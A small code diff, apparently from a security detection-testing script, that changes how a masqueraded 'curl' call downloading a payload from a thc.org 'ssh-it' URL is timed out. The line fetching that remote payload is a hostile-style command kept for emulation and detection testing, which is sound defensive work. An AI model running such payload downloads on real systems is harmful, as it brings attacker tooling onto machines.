@@ -27,7 +27,7 @@ def main() -> None:
 
     # Execute command
     log.info("Launching fake curl commands to download payload")
-    _ = _common.execute_command([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout_secs=5, kill=True)
+    _ = _common.execute_command([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout_secs=5)
 
     # cleanup
     _common.remove_file(masquerade)
